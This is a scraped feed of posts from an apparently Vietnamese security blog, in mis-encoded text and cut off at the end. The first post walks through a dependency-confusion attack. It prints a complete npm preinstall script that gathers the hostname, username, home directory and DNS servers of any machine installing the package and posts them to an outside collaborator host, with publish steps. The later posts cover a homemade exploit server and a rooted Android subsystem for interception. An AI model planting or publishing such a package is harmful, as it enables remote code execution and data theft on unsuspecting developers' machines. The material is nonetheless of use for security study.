Tr·ª£ th·ªß ƒë·∫Øc l·ª±c cho pentesters v√† geeks"},{"content":" B√†i vi·∫øt n√†y ƒë∆∞·ª£c d·ªãch v√† vi·∫øt theo √Ω hi·ªÉu c·ªßa ng∆∞·ªùi vi·∫øt th√¥ng qua nhi·ªÅu ngu·ªìn\n K·ªÉ t·ª´ khi b·∫°n m·ªõi h·ªçc code Python, b·∫°n c√≥ s·ª≠ d·ª•ng m·∫•y package r·∫•t ti·ªán l·ª£i install tr√™n pip kh√¥ng\n1  pip install \u0026lt;package_name\u0026gt;   Nh∆∞ m√¨nh th√¨ m√¨nh c·ª© th·∫ø install, kh√¥ng c·∫ßn bi·∫øt l√† package ƒë√≥ c√≥ ƒë·ªß tin t∆∞·ªüng hay kh√¥ng, c≈©ng ch·∫≥ng th√®m ƒë·ªçc source c·ªßa c√°i package ƒë√≥ n·ªØa, c·ª© install ƒë∆∞·ª£c vi·ªác c·ªßa m√¨nh ƒë√£ :D, ƒë·∫øn khi m√¨nh ƒë·ªçc ƒë∆∞·ª£c c√°i b√†i vi·∫øt n√†y, th√¨ m√¨nh v·∫´n c·ª© tin t∆∞·ªüng package ƒë√≥ th√¥i, v·∫´n ch·∫≥ng m·∫£y may suy nghƒ© g√¨ :frowning:\nM·ªôt s·ªë ng√¥n ng·ªØ l·∫≠p tr√¨nh (nh∆∞ Python, nodejs, Ruby, \u0026hellip;), ƒëi k√®m v·ªõi m·ªôt ph∆∞∆°ng ph√°p c·ª±c k·ª≥ d·ªÖ d√†ng ƒë·ªÉ c√†i ƒë·∫∑t package cho c√°c project c·ªßa b·∫°n. Nh·ªØng package n√†y th∆∞·ªùng n·∫±m tr√™n c√°c repositories public, n∆°i b·∫•t k·ª≥ ai c≈©ng c√≥ th·ªÉ t·ª± do t·∫£i l√™n c√°c package cho ng∆∞·ªùi kh√°c s·ª≠ d·ª•ng.\n Python c√≥ pip https://pypi.org/ Node c√≥ npm https://www.npmjs.com/package RubyGem c√≥ gem https://rubygems.org/  C√°ch c√†i ƒë·∫∑t c·ª±c k·ª≥ d·ªÖ d√†ng, nh∆∞ m√¨nh ƒë√£ n√≥i ·ªü tr√™n, ch·ªâ c·∫ßn s·ª≠ d·ª•ng c√¢u l·ªánh npm install \u0026lt;package_name\u0026gt; l√† c√≥ th·ªÉ k√©o code t·ª´ registry public tr√™n https://www.npmjs.com/package v·ªÅ ƒë·ªÉ b·∫°n s·ª≠ d·ª•ng r·ªìi.\n∆† v·∫≠y th√¨ khi t·∫£i xu·ªëng v√† s·ª≠ d·ª•ng m·ªôt package t·ª´ b·∫•t k·ª≥ ngu·ªìn n√†o trong s·ªë n√†y, v·ªÅ c∆° b·∫£n b·∫°n ƒëang tin t∆∞·ªüng t√°c gi·∫£ c·ªßa n√≥ ƒë·ªÉ ch·∫°y code tr√™n m√°y c·ªßa b·∫°n. V√¨ v·∫≠y, s·ª± tin t∆∞·ªüng m√π qu√°ng n√†y c√≥ th·ªÉ b·ªã khai th√°c b·ªüi nh·ªØng ng∆∞·ªùi c√≥ √Ω ƒë·ªì x·∫•u hay kh√¥ng?\nT·∫•t nhi√™n l√† c√≥ th·ªÉ\nKh√¥ng c√≥ package hosting services n√†o c√≥ th·ªÉ ƒë·∫£m b·∫£o r·∫±ng t·∫•t c·∫£ code m√† ng∆∞·ªùi d√πng t·∫£i l√™n ƒë·ªÅu kh√¥ng c√≥ ph·∫ßn m·ªÅm ƒë·ªôc h·∫°i. Nghi√™n c·ª©u tr∆∞·ªõc ƒë√¢y ƒë√£ ch·ªâ ra r·∫±ng typosquatting - m·ªôt cu·ªôc t·∫•n c√¥ng t·∫≠n d·ª•ng c√°c phi√™n b·∫£n typo\u0026rsquo;d c·ªßa c√°c t√™n package ph·ªï bi·∫øn - c√≥ th·ªÉ c·ª±c k·ª≥ hi·ªáu qu·∫£ trong vi·ªác truy c·∫≠p v√†o c√°c PC ng·∫´u nhi√™n tr√™n to√†n th·∫ø gi·ªõi.\nIdeal Trong b√†i ph√¢n t√≠ch hack Paypal v√†o nƒÉm 2020, Justin Gardner (@Rhynorater) v√† Alex Birsan (@alex.birsan) ƒë√£ chia s·∫ª m·ªôt ch√∫t th√∫ v·ªã v·ªÅ source code nodejs ƒë∆∞·ª£c t√¨m th·∫•y tr√™n GitHub c·ªßa Paypal.\nCode Paypal s·ª≠ d·ª•ng n·ªôi b·ªô, v√† b·∫•t gi·ªù trong file package.json (l√† m·ªôt file ch·ª©a t√™n c√°c dependencies, s·ª≠ d·ª•ng ƒë·ªÉ install packages cho nhanh) c·ªßa n√≥, d∆∞·ªùng nh∆∞ ch·ª©a m·ªôt s·ª± pha tr·ªôn c·ªßa c√°c public v√† private dependencies - c√°c package c√¥ng khai t·ª´ NPM, c≈©ng nh∆∞ c√°c g√≥i ƒë∆∞·ª£c ph√°t tri·ªÉn private (internal) - c√≥ th·ªÉ ƒë∆∞·ª£c ph√°t h√†nh n·ªôi b·ªô b·ªüi Paypal.\nNh·ªØng c√°i t√™n n√†y kh√¥ng t·ªìn t·∫°i tr√™n public npm registry v√†o th·ªùi ƒëi·ªÉm ƒë√≥.\nV·∫≠y th√¨ √Ω t∆∞·ªüng ƒë∆∞·ª£c ƒë·∫∑t ra l√†, n·∫øu m√¨nh t·∫°o 1 package v·ªõi t√™n gi·ªëng v·ªõi package m√† Paypal code ri√™ng th√¨ sao, sau ƒë√≥ public l√™n registry c·ªßa npm, v·∫≠y th√¨ ƒëi·ªÅu g√¨ s·∫Ω x·∫£y ra.\n ƒêi·ªÅu g√¨ s·∫Ω x·∫£y ra n·∫øu m√£ ƒë·ªôc ƒë∆∞·ª£c t·∫£i l√™n NPM d∆∞·ªõi nh·ªØng c√°i t√™n n√†y? C√≥ th·ªÉ m·ªôt s·ªë project n·ªôi b·ªô c·ªßa PayPal thay v√¨ k√©o t·ª´ private registry l·∫°i th·ª±c hi·ªán k√©o code t·ª´ public registry, sau ƒë√≥ th·ª±c thi code ƒë·ªôc h·∫°i ƒë√≥ :o C√°c nh√† ph√°t tri·ªÉn, ho·∫∑c th·∫≠m ch√≠ c√°c h·ªá th·ªëng t·ª± ƒë·ªông, s·∫Ω b·∫Øt ƒë·∫ßu ch·∫°y code b√™n trong c√°c th∆∞ vi·ªán? N·∫øu ƒëi·ªÅu n√†y ho·∫°t ƒë·ªông, ch√∫ng ta c√≥ th·ªÉ nh·∫≠n ƒë∆∞·ª£c m·ªôt kho·∫£n bug bounty t·ª´ n√≥? Li·ªáu cu·ªôc t·∫•n c√¥ng n√†y c≈©ng c√≥ t√°c d·ª•ng ch·ªëng l·∫°i c√°c c√¥ng ty kh√°c?  Th·ª≠ nghi·ªám  ·ªû ƒë√¢y m√¨nh v√≠ d·ª• v·ªõi npm, c√°c package kh√°c t∆∞∆°ng t·ª±, tu·ª≥ theo spec c·ªßa c√°c ng√¥n ng·ªØ ƒë√≥\n ƒê·∫ßu ti√™n c√°c b·∫°n c·∫ßn ƒë·ªçc ƒë∆∞·ª£c n·ªôi dung c·ªßa file package.json c·ªßa project ƒë√≥ (c√≥ th·ªÉ public tr√™n github, trang web cho ph√©p ƒë·ªçc file package.json,\u0026hellip;), sau ƒë√≥ b·∫°n c√≥ th·ªÉ ki·ªÉm tra to√†n b·ªô package trong project ƒë√≥ hi·ªán t·∫°i c√≥ public tr√™n npm hay kh√¥ng, b·∫±ng c√°ch search t√™n package ƒë√≥ tr√™n https://www.npmjs.com/, ho·∫∑c c≈©ng c√≥ th·ªÉ s·ª≠ d·ª•ng c√¥ng c·ª• https://github.com/visma-prodsec/confused cho nhanh c≈©ng ƒë∆∞·ª£c\nPh√°t hi·ªán ra package spr-svg-loaders kh√¥ng c√≥ tr√™n public registry c·ªßa npmjs\nCreating Malicious Packages (NPM) Th·ª±c hi·ªán ƒëƒÉng k√Ω package spr-svg-loaders l√™n public NPM registry\n C√†i ƒë·∫∑t npm 1  sudo apt install npm    ƒêƒÉng k√Ω account t·∫°i https://www.npmjs.com/signup Login account npm v·ªõi l·ªánh 1  npm login    T·∫°o folder spr-svg-loaders T·∫°o NPM package 1 2  cd spr-svg-loaders npm init   ·ªû ƒë√¢y c√°c b·∫°n c·ª© ·∫•n enter th√¥i, th√≠ch ƒëi·ªÅn th√¥ng tin n√†o v√†o c≈©ng ƒë∆∞·ª£c Ch·ªânh s·ª≠a l·∫°i file package.json\nNPM h·ªó tr·ª£ preinstall, ƒëi·ªÅu n√†y gi√∫p cho ai k√©o package n√†y v·ªÅ ƒë·ªÅu th·ª±c thi l·ªánh node index.js T·∫°o file index.js v·ªõi n·ªôi dung 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  //author:- whitehacker003@protonmail.com const os = require(\u0026#34;os\u0026#34;); const dns = require(\u0026#34;dns\u0026#34;); const querystring = require(\u0026#34;querystring\u0026#34;); const https = require(\u0026#34;https\u0026#34;); const packageJSON = require(\u0026#34;./package.json\u0026#34;); const package = packageJSON.name; const trackingData = JSON.stringify({ p: package, c: __dirname, hd: os.homedir(), hn: os.hostname(), un: os.userInfo().username, dns: dns.getServers(), r: packageJSON ? packageJSON.___resolved : undefined, v: packageJSON.version, pjson: packageJSON, }); var postData = querystring.stringify({ msg: trackingData, }); var options = { hostname: \u0026#34;burpcollaborator.net\u0026#34;, //replace burpcollaborator.net with Interactsh or pipedream  port: 443, path: \u0026#34;/\u0026#34;, method: \u0026#34;POST\u0026#34;, headers: { \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;Content-Length\u0026#34;: postData.length, }, }; var req = https.request(options, (res) =\u0026gt; { res.on(\u0026#34;data\u0026#34;, (d) =\u0026gt; { process.stdout.write(d); }); }); req.on(\u0026#34;error\u0026#34;, (e) =\u0026gt; { // console.error(e); }); req.write(postData); req.end();    Xong ph·∫ßn code, b√¢y gi·ªù ch·ªâ c·∫ßn public package n√†y l√™n public registry npmjs l√† xong 1  npm publish   N√≥ s·∫Ω t∆∞∆°ng t·ª± th·∫ø n√†y, n·∫øu b·∫°n n√†o g·∫∑p l·ªói 403, th√¨ c√≥ th·ªÉ b·∫°n ƒëang publish version th·∫•p h∆°n, ho·∫∑c b·∫°n kh√¥ng c√≥ quy·ªÅn v·ªõi c√°i package ƒë√≥.\nTh√†nh c√¥ng th√¨ b·∫°n s·∫Ω nh·∫≠n ƒë∆∞·ª£c 1 c√°i t∆∞∆°ng t·ª± th·∫ø n√†y https://www.npmjs.com/package/spr-svg-loaders  K·∫øt qu·∫£ Ng·ªìi ch·ªù 1 l√°t l√† th·∫•y c√≥ m√°y k√©o package n√†y v·ªÅ, b·∫°n c√≥ th·ªÉ xem th√¥ng tin nh∆∞ hostname, full path, username, \u0026hellip; V·∫≠y b·∫°n c√≥ th·ªÉ RCE ƒë·∫øn m√°y m√† install c√°i package n√†y r·ªìi :cold_sweat:\nTheo Alex Birsan, anh ·∫•y ƒë√£ scan v√† l·∫•y ƒë∆∞·ª£c h√†ng trƒÉm package private kh√¥ng c√≥ tr√™n public registry, v√† anh ·∫•y th·ª≠ nghi·ªám t·∫•n c√¥ng v√† t·ª∑ l·ªá th√†nh c√¥ng ƒë√°ng kinh ng·∫°c.\n ƒê·ªçc th√™m t·∫°i : https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610\n Nguy√™n nh√¢n V·∫≠y nguy√™n nh√¢n t·ª´ ƒë√¢u m√† ra, c√≥ th·ªÉ c·∫ßn t·ªõi b√†i vi·∫øt n·ªØa ƒë·ªÉ c√≥ th·ªÉ t√¨m nguy√™n nh√¢n s√¢u ra g·ªëc r·ªÖ c·ªßa v·∫•n ƒë·ªÅ n√†y, h·∫πn c√°c b·∫°n v√†o b√†i th·ª© 2. See you :blush:\nTham kh·∫£o  https://dhiyaneshgeek.github.io/web/security/2021/09/04/dependency-confusion/ https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610 https://systemweakness.com/rce-via-dependency-confusion-e0ed2a127013  ","permalink":"https://minhtuanact.ml/posts/rce-voi-dependency-confusion/","summary":"B√†i vi·∫øt n√†y ƒë∆∞·ª£c d·ªãch v√† vi·∫øt theo √Ω hi·ªÉu c·ªßa ng∆∞·ªùi vi·∫øt th√¥ng qua nhi·ªÅu ngu·ªìn\n K·ªÉ t·ª´ khi b·∫°n m·ªõi h·ªçc code Python, b·∫°n c√≥ s·ª≠ d·ª•ng m·∫•y package r·∫•t ti·ªán l·ª£i install tr√™n pip kh√¥ng\n1  pip install \u0026lt;package_name\u0026gt;   Nh∆∞ m√¨nh th√¨ m√¨nh c·ª© th·∫ø install, kh√¥ng c·∫ßn bi·∫øt l√† package ƒë√≥ c√≥ ƒë·ªß tin t∆∞·ªüng hay kh√¥ng, c≈©ng ch·∫≥ng th√®m ƒë·ªçc source c·ªßa c√°i package ƒë√≥ n·ªØa, c·ª© install ƒë∆∞·ª£c vi·ªác c·ªßa m√¨nh ƒë√£ :D, ƒë·∫øn khi m√¨nh ƒë·ªçc ƒë∆∞·ª£c c√°i b√†i vi·∫øt n√†y, th√¨ m√¨nh v·∫´n c·ª© tin t∆∞·ªüng package ƒë√≥ th√¥i, v·∫´n ch·∫≥ng m·∫£y may suy nghƒ© g√¨ :frowning:","title":"RCE v·ªõi Dependency Confusion"},{"content":"N·∫øu c√≥ b·∫°n n√†o ƒë√£ t·ª´ng l√†m lab v·ªõi Portswigger th√¨ ch·∫Øc h·∫≥n c≈©ng bi·∫øt Exploit Server c·ªßa Portswigger ho·∫°t ƒë·ªông nh∆∞ n√†o.\nN·∫øu b·∫°n n√†o ch∆∞a bi·∫øt v·ªÅ Exploit Server n√†y th√¨ m√¨nh c√≥ th·ªÉ m√¥ t·∫£ n√≥ 1 ch√∫t, c≈©ng kh√° ƒë∆°n gi·∫£n th√¥i :D.\nƒê·∫ßu ti√™n Exploit Server c√≥ 4 ph·∫ßn\n HTTPS: S·ª≠ d·ª•ng HTTPS hay kh√¥ng File: n√≥ ch√≠nh l√† URI ƒë√≥ Head: Ph·∫ßn ƒë·∫ßu c·ªßa response m√† b·∫°n mu·ªën server tr·∫£ v·ªÅ Body: Ph·∫ßn th√¢n c·ªßa response m√† b·∫°n mu·ªën server tr·∫£ v·ªÅ  V√≠ d·ª• v·ªõi setting nh∆∞ h√¨nh tr√™n, khi truy c·∫≠p v√†o URL ta s·∫Ω ƒë∆∞·ª£c response nh∆∞ sau\nC√°ch ho·∫°t ƒë·ªông kh√° l√† ƒë∆°n gi·∫£n ph·∫£i kh√¥ng, m√¨nh nhi·ªÅu khi c·∫ßn ph·∫£i s·ª≠ d·ª•ng Exploit Server nh∆∞ n√†y ƒë·ªÉ exploit hay ki·ªÉm tra l·ªó h·ªïng b·∫£o m·∫≠t cho c√°c project pentest. M√† s·ª≠ d·ª•ng c√°i Exploit Server c·ªßa Portswigger n√≥ c·∫ßn ph·∫£i truy c·∫≠p h∆°i l·∫±ng nh·∫±ng + c√≥ expired time n√™n m√¨nh t·ª± code l·∫•y 1 server ƒë·ªÉ t·ª± x√†i lu√¥n :joy:\nCode Exploit Server Simulator ƒê·∫ßu ti√™n, do c√°ch ho·∫°t ƒë·ªông kh√° ƒë∆°n gi·∫£n + hi·ªÉn th·ªã raw response nh∆∞ tr√™n, c√°c b·∫°n c√≥ th·ªÉ s·ª≠ d·ª•ng b·∫•t k·ª≥ ng√¥n ng·ªØ n√†o c≈©ng ƒë∆∞·ª£c, ·ªü ƒë√¢y m√¨nh s·ª≠ d·ª•ng NodeJS Express cho n√≥ ƒë∆°n gi·∫£n :joy:\nIndex ƒê·∫ßu ti√™n m√¨nh khai b√°o c√°c th√†nh ph·∫ßn ƒë·ªÉ hi·ªÉn th·ªã ra b√™n ngo√†i index, giao di·ªán th√¨ clone gi·ªëng y ƒë√∫c c·ªßa Portswigger th√¥i, s·ª≠ d·ª•ng pug ƒë·ªÉ l√†m view engine.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  const express = require(\u0026#39;express\u0026#39;) const app = express() const bodyParser = require(\u0026#39;body-parser\u0026#39;); const port = 3001 const morgan = require(\u0026#39;morgan\u0026#39;); const path = require(\u0026#39;path\u0026#39;) const fs = require(\u0026#39;fs\u0026#39;) let responseHead = `HTTP/1.1 200 OK Content-Type: text/html; charset=UTF-8` let responseFile = \u0026#39;/exploit\u0026#39; let responseBody = \u0026#39;Hello, world!\u0026#39; //index app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { res.render(\u0026#39;form\u0026#39;, { responseHead, responseFile, responseBody}); }); app.set(\u0026#39;view engine\u0026#39;, \u0026#39;pug\u0026#39;);   Ti·∫øp theo\n1 2 3 4 5  // public static file app.use(express.static(\u0026#39;public\u0026#39;)) // for parsing application/xwww-form-urlencoded app.use(bodyParser.urlencoded({ extended: true }));   ƒë·ªÉ public th∆∞ m·ª•c static ra ngo√†i nh∆∞ style.css\nStore response in server 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  app.post(\u0026#39;/\u0026#39;, function(req, res){ responseHead = req.body.responseHead responseFile = req.body.responseFile responseBody = req.body.responseBody formAction = req.body.formAction if (formAction === \u0026#39;ACCESS_LOG\u0026#39;){ res.redirect(302, \u0026#34;/access-log\u0026#34;) return; } if (formAction === \u0026#39;VIEW_EXPLOIT\u0026#39;){ res.redirect(302, responseFile) return; } else { res.redirect(302, \u0026#34;/\u0026#34;) res.end() } });   ƒêo·∫°n n√†y m√¨nh l·∫•y to√†n b·ªô th√¥ng tin header, file, body ƒë·ªÉ l∆∞u l·∫°i v√†o bi·∫øn, v√† c√≥ c√°c action t∆∞∆°ng ·ª©ng ƒë·ªÉ ch·∫°y nh∆∞ truy c·∫≠p file log, view exploit.\nExploit 1 2 3 4 5 6 7 8 9 10 11 12 13 14  // Get URI exploit app.get(\u0026#39;*\u0026#39;, (req, res) =\u0026gt; { if (req.path !== responseFile) { res.status(404).send(); return; } const responseMessage = `${responseHead}${responseBody}` res.socket.end(responseMessage) });   ƒêo·∫°n n√†y m√¨nh l·∫•y tr√™n m·∫°ng :joy: ch·ªâ l√† hi·ªÉn th·ªã raw response th√¥i, c√°c b·∫°n c√≥ th·ªÉ th√™m header, body tu·ª≥ √Ω, m√¨nh l·∫•y tr·ª±c ti·∫øp gi√° tr·ªã trong tr∆∞·ªùng Head, Body, File ƒë·ªÉ tr·∫£ v·ªÅ gi√° tr·ªã th√¥i :D\nAccess Log 1 2 3  // create access-log var accessLogStream = fs.createWriteStream(path.join(__dirname, \u0026#39;/public/access.log\u0026#39;), { flags: \u0026#39;a\u0026#39; }) app.use(morgan(\u0026#39;combined\u0026#39;, { stream: accessLogStream }))   ·ªû ƒë√¢y m√¨nh s·ª≠ d·ª•ng fs v√† morgan c√≥ s·∫µn ƒë·ªÉ l∆∞u t·∫•t t·∫ßn t·∫≠t log request l·∫°i, log request c√≥ th·ªÉ check ƒë∆∞·ª£c ip, user-agent, th·ªùi gian, v√¢n v√¢n \u0026hellip;\nhttps://github.com/tuannm-1876/exploit-server-simulator\nMu·ªën public ra ngo√†i internet th√¨ c√≥ th·ªÉ s·ª≠ d·ª•ng nh·ªØng d·ªãch v·ª• nh∆∞ ngrok,localtunnel .. v·ª´a public port ra ngo√†i internet v·ª´a c√≥ th·ªÉ s·ª≠ d·ª•ng HTTP, HTTPS ƒë∆∞·ª£c.\nMissing feature Do l∆∞·ªùi + code kh√° l√† ng·ªù u n√™n v·∫´n c√≤n v√†i feature ch∆∞a ho√†n thi·ªán, hi v·ªçng c√°c b·∫°n c√≥ th·ªÉ contribute ae s·ª≠ d·ª•ng :joy:\n Dockerfile Multi URI exploit Header and Body with Byte-code  ","permalink":"https://minhtuanact.ml/posts/code-exploit-server-nhu-portswigger-de-khai-thac-web/","summary":"N·∫øu c√≥ b·∫°n n√†o ƒë√£ t·ª´ng l√†m lab v·ªõi Portswigger th√¨ ch·∫Øc h·∫≥n c≈©ng bi·∫øt Exploit Server c·ªßa Portswigger ho·∫°t ƒë·ªông nh∆∞ n√†o.\nN·∫øu b·∫°n n√†o ch∆∞a bi·∫øt v·ªÅ Exploit Server n√†y th√¨ m√¨nh c√≥ th·ªÉ m√¥ t·∫£ n√≥ 1 ch√∫t, c≈©ng kh√° ƒë∆°n gi·∫£n th√¥i :D.\nƒê·∫ßu ti√™n Exploit Server c√≥ 4 ph·∫ßn\n HTTPS: S·ª≠ d·ª•ng HTTPS hay kh√¥ng File: n√≥ ch√≠nh l√† URI ƒë√≥ Head: Ph·∫ßn ƒë·∫ßu c·ªßa response m√† b·∫°n mu·ªën server tr·∫£ v·ªÅ Body: Ph·∫ßn th√¢n c·ªßa response m√† b·∫°n mu·ªën server tr·∫£ v·ªÅ  V√≠ d·ª• v·ªõi setting nh∆∞ h√¨nh tr√™n, khi truy c·∫≠p v√†o URL ta s·∫Ω ƒë∆∞·ª£c response nh∆∞ sau","title":"Code Exploit Server nh∆∞ Portswigger ƒë·ªÉ khai th√°c web"},{"content":" Ng√†y x·ª≠a ng√†y x∆∞a m√¨nh c√≥ 1 ∆∞·ªõc ao \u0026ldquo;l√†m th·∫ø n√†o ƒë·ªÉ Windows + Linux ho√† v√†o l√†m m·ªôt nh·ªâ\u0026rdquo;, v√† r·ªìi WSL ƒë∆∞·ª£c sinh ra v√†o h·ªìi 5 nƒÉm tr∆∞·ªõc. Tuy c√≤n kh√° sida v√† l·∫Øm l·ªói, tuy nhi√™n v√†o nƒÉm 2019 WSL2 ra ƒë·ªùi c√πng v·ªõi s·ª≠ d·ª•ng kernel linux ch√≠nh ng·∫°ch c√πng v·ªõi c√°c thay ƒë·ªïi g·∫ßn ƒë√¢y ƒë√£ l√†m WSL2 ho√†n thi·ªán h∆°n (nh·∫•t l√† m·ªõi c√≥ t√≠nh nƒÉng Run Linux GUI apps s·ª≠ d·ª•ng X11 tr√™n Windows 11 Run Linux GUI apps with WSL | Microsoft Docs)\n V√† ƒë·∫•y l√† chuy·ªán m√¨nh mong mu·ªën ƒë√£ tr·ªü th√†nh hi·ªán th·ª±c, xong r·ªìi c√≥ th√¥ng tin Microsoft ƒëang ph√°t tri·ªÉn WSA (Windows Subsystem for Android) v√†o 2 nƒÉm tr∆∞·ªõc l√†m m√¨nh h√°o h·ª©ng ch·ªù ƒë·∫øn c√°i ng√†y m√† Windows + Linux + Android ch·∫°y t·∫•t t·∫ßn t·∫≠n tr√™n 1 con m√°y. V√† r·ªìi c√°i ng√†y ƒë·∫•y cu·ªëi c√πng c≈©ng tr·ªü th√†nh hi·ªán th·ª±c ‚ï∞(¬∞‚ñΩ¬∞)‚ïØ B√†i vi·∫øt n√†y m√¨nh s·∫Ω h∆∞·ªõng d·∫´n c√°c b·∫°n l√†m sao ƒë·ªÉ c√†i WSA v√† c√†i WSA ph·ª•c v·ª• m·ª•c ƒë√≠ch pentest android nh√©.\nChu·∫©n b·ªã ƒê·ªÉ ti·∫øn h√†nh c√†i ƒë·∫∑t WSA m·ªôt c√°ch ƒë∆°n gi·∫£n, c√°c b·∫°n c·∫ßn x√°c ƒë·ªãnh m·ª•c ƒë√≠ch s·ª≠ d·ª•ng WSA ƒë·ªÉ l√†m g√¨ (d√πng nh∆∞ ng∆∞·ªùi d√πng b√¨nh th∆∞·ªùng, s·ª≠ d·ª•ng cho m·ª•c ƒë√≠ch pentest, \u0026hellip;). ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ban ƒë·∫ßu theo Microsoft c√¥ng b·ªë l√†:\n B·∫°n c·∫ßn ph·∫£i s·ª≠ d·ª•ng Windows 11, Windows 10 tr·ªü xu·ªëng kh√¥ng c√†i ƒë∆∞·ª£c WSA (th·∫≠t ra m√¨nh ch∆∞a th·ª≠, ƒë·∫•y l√† nsx c√¥ng b·ªë th√¥i üòÇ) Nhi·ªÅu RAM 1 ch√∫t, 16GB l√† v·ª´a ƒë·ªß ƒê∆∞∆°ng nhi√™n l√† k th·ªÉ thi·∫øu SSD r·ªìi Processor y√™u c·∫ßu kh√° cao, m√¨nh ƒëang s·ª≠ d·ª•ng Ryzen 7 5800x, ch·∫°y kh√° m∆∞·ª£t m√† Chip ki·∫øn tr√∫c x64 hay ARM64 ƒë·ªÅu ƒë∆∞·ª£c (support h·∫øtttt)   C√†i ƒë·∫∑t C√†i ƒë·∫∑t si√™u ƒë∆°n gi·∫£n C√°c b·∫°n mu·ªën c√†i ƒë·∫∑t nhanh ch√≥ng, ƒë∆°n gi·∫£n ƒë·ªÉ s·ª≠ d·ª•ng b√¨nh th∆∞·ªùng theo h∆∞·ªõng d·∫´n c·ªßa nsx lu√¥n th√¨ ƒë∆°n gi·∫£n l·∫Øm. Chuy·ªÉn region sang US r·ªìi b·∫•m v√†o link n√†y c√†i ƒë·∫∑t Amazon Appstore ms-windows-store://pdp/?productid=9NJHK44TTKSX. C√†i ƒë·∫∑t l√™n v√† l√†m theo h∆∞·ªõng d·∫´n 1 t√Ω l√† xong WSA r·ªìi, nh∆∞ng m√† c√°i store c·ªßa Amazon ch·∫£ c√≥ g√¨ ƒë√¢u, ph·∫£i c√†i ƒë·∫∑t app b·∫±ng file APK b√™n ngo√†i.\nC√†i ƒë·∫∑t ƒë∆°n gi·∫£n (kh√¥ng c√≥ ch·ªØ si√™u) Nh∆∞ng m√† b√†i vi·∫øt n√†y m√¨nh h∆∞·ªõng t·ªõi c√†i ƒë·∫∑t WSA cho Pentester Android, s·ª≠ d·ª•ng c√°ch c√†i ƒë·∫∑t nhanh h∆°n, root m√°y lu√¥n + Google Apps c√πng v·ªõi r·∫•t nhi·ªÅu t√≠nh nƒÉng thu·∫≠n ti·ªán cho vi·ªác pentest n·ªØa\nƒê·∫ßu ti√™n c√°c b·∫°n c√≥ th·ªÉ xem repo n√†y LSPosed/MagiskOnWSA: Integrate Magisk root and Google Apps (OpenGApps) into WSA (Windows Subsystem for Android) (github.com), m√¨nh c√†i ƒë·∫∑t theo repo n√†y lu√¥n, kh√° nhanh ch√≥ng. Build WSA ¬∑ LSPosed/MagiskOnWSA@1d4f333 (github.com) c√°c b·∫°n c√≥ th·ªÉ download b·∫£n build t·∫°i ƒë√¢y, c√≥ 2 phi√™n b·∫£n x64 v√† arm64. M√¨nh s·ª≠ d·ª•ng x64 n√™n t·∫£i b·∫£n b√™n d∆∞·ªõi nh√©. C√°ch c√†i ƒë·∫∑t th√¨ si√™u d·ªÖ, t·∫£i b·∫£n zip ƒë√≥ v·ªÅ, gi·∫£i n√©n ra, chu·ªôt ph·∫£i v√†o Install.ps1 r·ªìi Run with powershell, ti·∫øp t·ª•c ·∫•n Yes ƒë·ªÉ c·∫•p th√™m quy·ªÅn cho n√≥ c√†i, v√† ch·ªù 1 t√Ω. Th·∫ø l√† xong WSA kh·ªüi ƒë·ªông l√™n c√πng v·ªõi Google Apps, phi√™n b·∫£n n√†y l√† pico (Android 11) Magisk c≈©ng ƒë∆∞·ª£c c√†i ƒë·∫∑t lu√¥n, hi·ªán n√≥ ƒëang ho·∫°t ƒë·ªông t∆∞∆°ng th√≠ch ho√†n to√†n v·ªõi WSA. Magisk l√† 1 ·ª©ng d·ª•ng ƒë∆∞·ª£c s·ª≠ d·ª•ng cho c√°c thi·∫øt b·ªã Root Android. Root s·∫Ω cung c·∫•p th√™m ch·ª©c nƒÉng ƒë·ªÉ sau n√†y c√≥ th·ªÉ gi√∫p √≠ch cho b·∫°n. V·ªõi c√°c b·∫°n n√†o s·ª≠ d·ª•ng ƒë·ªÉ pentest th√¨ ƒë·ª´ng c√≥ login v√†o Google Play nho√©, m√¨nh ƒëang g·∫∑p v·∫•n ƒë·ªÅ v·ªõi n√≥, kh√¥ng bi·∫øt bao gi·ªù m·ªõi fix ƒë∆∞·ª£c :cry:\nTi·∫øp t·ª•c c√†i th√™m WSA Pacman ƒë·ªÉ thu·∫≠n ti·ªán cho vi·ªác c√†i APK c≈©ng nh∆∞ l√† truy c·∫≠p v√†o setting c·ªßa WSA alesimula/wsa_pacman: A GUI package manager and package installer for Windows Subsystem for Android (WSA) (github.com)\nB·∫£n release c√≥ ·ªü Release WSA-pacman v1.3.4 ¬∑ alesimula/wsa_pacman (github.com)\nTi·∫øp theo, ch√∫ng ta m·ªü Settings c·ªßa WSA l√™n sau ƒë√≥ g·∫°t chuy·ªÉn sang ch·∫ø ƒë·ªô developer mode ƒë·ªÉ c√≥ th·ªÉ debug b·∫±ng ADB Kh·ªüi ƒë·ªông WSA Pacman l√™n v√†o ch√∫ng ta c√≥ th·ªÉ th·∫•y ƒë∆∞·ª£c n√≥ ƒë√£ ƒë∆∞·ª£c k·∫øt n·ªëi v·ªõi WSA, v√† gi·ªù m√¨nh c√≥ th·ªÉ k·∫øt n·ªëi t·ªõi ADB shell ƒë∆∞·ª£c r·ªìi C√°c b·∫°n mu·ªën l√™n root th√¨ si√™u ƒë∆°n gi·∫£n r·ªìi C·∫•p quy·ªÅn 1 ph√°t l√† l√™n root lu√¥n :joy:\nIntercept with Burpsuite ƒê·ªÉ intercept ƒë∆∞·ª£c v·ªõi BurpSuite th√¨ c·∫ßn c√†i ƒë·∫∑t trusted root certification c·ªßa Burp v√†o WSA, tuy nhi√™n vi·ªác n√†y c·ª±c k·ª≥ ƒë∆°n gi·∫£n khi Android ƒë√£ ƒë∆∞·ª£c Root v√† l·∫°i c√≤n ƒëang c√†i Magisk n·ªØa :joy:\nV·ªõi Magisk NVISOsecurity/MagiskTrustUserCerts: A Magisk module that automatically adds user certificates to the system root CA store (github.com)\nS·ª≠ d·ª•ng module n√†y v·ªõi Magisk, khi c√°c b·∫°n c√†i ƒë·∫∑t cert cho user th√¨ n√≥ s·∫Ω t·ª± 